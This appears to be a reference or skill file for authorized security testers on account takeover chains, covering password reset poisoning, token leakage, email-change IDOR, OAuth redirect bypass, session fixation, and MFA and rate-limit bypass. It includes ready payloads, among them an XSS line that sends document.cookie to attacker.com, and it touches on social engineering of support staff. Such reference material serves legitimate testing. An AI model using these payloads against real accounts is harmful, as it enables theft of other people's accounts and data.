---
name: account-takeover
description: Account takeover techniques combining auth flaws, token abuse, and multi-step attack chains
---

# Account Takeover (ATO)

Account takeover chains multiple vulnerabilities to gain persistent access to another user's account. Standalone bugs (weak reset tokens, XSS, IDOR in email-change) often only achieve ATO when combined. Understanding the full ATO chain is what separates high-severity reports from informational findings.

## Attack Surface

**Primary Vectors**
- Password reset flows (token leakage, guessable tokens, host header injection)
- Email/username change flows (missing re-auth, IDOR)
- OAuth/SSO flows (redirect_uri bypass, state fixation, token leakage)
- Session management (fixation, weak tokens, no expiry)
- Credential-based (brute force, credential stuffing, password spraying)
- XSS → session/token exfiltration
- MFA bypass (token reuse, race conditions, backup codes)
- IDOR on account settings

## Attack Chains

### Password Reset Poisoning (Host Header)

```
POST /forgot-password
Host: attacker.com     ← injected

# Server generates: https://attacker.com/reset?token=SECRET_TOKEN
# Sends email to victim with attacker's domain
# Victim clicks → attacker receives token → ATO
```

Variants:
```
Host: legit.com
X-Forwarded-Host: attacker.com   ← some apps use this for URL construction

Host: legit.com:@attacker.com    ← credential confusion
Host: legit.com@attacker.com
```

### Password Reset Token Leakage

**Referer header leakage**
```
Reset link: https://app.com/reset?token=SECRET
User clicks link, page has third-party scripts
Referer: https://app.com/reset?token=SECRET sent to third party
```

**Frontend logging**
```javascript
// Token visible in browser history, analytics, error logs
window.analytics.track('page_view', {url: window.location.href});
// If reset page URL contains token → token in analytics
```

**Predictable tokens**
```
# Sequential: token=1337, token=1338
# Timestamp-based: token=1620000000
# PRNG without proper seeding: guessable from known outputs
```

### Email Change Without Re-authentication

```
# Attacker controls victim session (via XSS or stolen cookie)
# Or: CSRF on email-change endpoint
POST /account/email
new_email=attacker@evil.com
# No password confirmation required → ATO via new email → password reset
```

### Email Change IDOR

```
POST /account/email
{"user_id": VICTIM_ID, "email": "attacker@evil.com"}
# Missing authorization check → change any user's email
```

### Username/Email Enumeration + Credential Stuffing

```
# Enumerate valid accounts via timing or error differences
POST /login: "User not found" vs "Invalid password" → confirms account existence
POST /reset: "Email sent" vs "Email not registered"

# Credential stuffing: use leaked DB credentials
# Password spraying: common passwords against enumerated accounts
```

### OAuth Token Leakage

```
# state parameter not validated
# redirect_uri bypass:
/oauth/authorize?redirect_uri=https://app.com/callback/../../../logout
/oauth/authorize?redirect_uri=https://app.com.attacker.com/callback
/oauth/authorize?redirect_uri=https://app.com/callback%20https://attacker.com

# Token in Referer:
https://app.com/callback?code=AUTH_CODE
User clicks link to external site → Referer leaks code
```

### Session Fixation

```
# 1. Attacker gets a pre-auth session: GET /login → Set-Cookie: session=FIXED_VALUE
# 2. Attacker forces victim to use this session ID (via XSS, direct link with cookie)
# 3. Victim logs in → session elevated to authenticated
# 4. Attacker uses FIXED_VALUE session → accesses victim account
```

### XSS → ATO Chain

```javascript
// 1. Find stored/reflected XSS
// 2. Exfiltrate session cookie:
fetch('//attacker.com/?c=' + document.cookie)
// 3. Or steal CSRF token and change email:
fetch('/account/email', {
  method: 'POST',
  headers: {'X-CSRF-Token': document.querySelector('[name=csrf]').value},
  body: 'email=attacker@evil.com'
})
// 4. Use stolen session or new email for password reset
```

### 2FA/MFA Bypass for ATO

```
# OTP brute force (if no rate limiting)
# OTP reuse (if no single-use enforcement)
# Response manipulation: {"mfa_required": false}
# Skip MFA step: jump directly to /dashboard after /login (before /mfa)
# Backup code abuse: generate/steal backup codes
# SIM swap / SMS hijacking (social engineering telecom)
```

### Account Pre-hijacking

Before victim creates account:
```
# 1. Register with victim's email (social account merge attack)
#    - If victim later logs in via OAuth with same email, may merge with attacker account
# 2. Unexpired reset token: request reset for victim's email before they register
# 3. Classic pre-hijack: register account, attacker sets password, victim "registers" via SSO
```

### Support/Admin ATO

```
# Social engineering support to change email
# Impersonating victim via email spoofing to support team
# IDV (identity verification) bypass via public info (DOB, last 4 SSN)
```

## Bypass Techniques

**Token Validation Bypass**
```
# Submit token with extra padding
token=VALID_TOKEN%00
token=VALID_TOKEN%20

# Case insensitive comparison
token=VALID_TOKEN → VALID_token

# Partial matching
token=VALID (if only first N chars checked)
```

**Rate Limit Bypass for OTP Brute Force**
```
# IP rotation
# X-Forwarded-For: [changing IPs]
# Parallel requests (race condition)
# Try all OTPs in one request if batching possible
```

**Email Normalization Bypass**

```
# App stores attacker+tag@gmail.com
# Victim uses attacker@gmail.com
# Some apps normalize → same account
victim@gmail.com vs victim+anything@gmail.com
victim@GMAIL.COM vs victim@gmail.com
victim@googlemail.com vs victim@gmail.com
```

## Testing Methodology

1. **Map auth flows** — Login, register, reset, email-change, OAuth, MFA, account merge
2. **Test reset token** — Entropy, expiry, single-use, host header injection, Referer leakage
3. **Test email change** — Re-auth required? IDOR? CSRF protected?
4. **Test session management** — Fixation, expiry after logout, token predictability
5. **Test OAuth** — state validation, redirect_uri variations, token in URL
6. **Test MFA** — Rate limits on OTP, reuse, response manipulation
7. **Enumerate accounts** — Error messages, timing, side channels
8. **Check pre-hijacking** — Register with victim email before they do

## Validation

1. Demonstrate login as victim account without knowing their password
2. Show which specific vulnerability was exploited in the chain
3. Provide step-by-step reproduction with victim account credentials/data visible
4. Show minimal-scope impact (profile data visible) without accessing sensitive personal info unnecessarily

## False Positives

- Token leakage to first-party analytics only
- Rate limiting prevents brute force
- Email change requires current password confirmation
- Reset token bound to IP/User-Agent
- OTP has proper single-use and expiry enforcement

## Impact

- Full account takeover → access to all user data
- Privilege escalation if admin account targeted
- Financial loss if payment methods accessible
- Regulatory impact (GDPR) via PII exposure

## Pro Tips

1. Always escalate from info-gathering to actual account access to maximize report severity
2. Password reset poisoning requires the victim to click the link — add social engineering context
3. Pre-hijacking attacks require registering before victim — test on beta/new signup flows
4. Combine email-change IDOR + password reset = ATO without needing session
5. OAuth `state` parameter missing is usually an ATO — build the chain to show it
6. Check password reset tokens from old emails (support accounts often have expired tokens stored)
7. Email normalization attacks work best on large providers (Gmail, Outlook)
8. Response manipulation for MFA (`success: true`) is often the fastest bypass

## Summary

ATO is about chaining weak primitives into full access. Any single auth weakness is a stepping stone: enumerate → take over email/username → trigger reset → access account. Focus on the chain, not individual bugs, and demonstrate the final access to maximize impact.
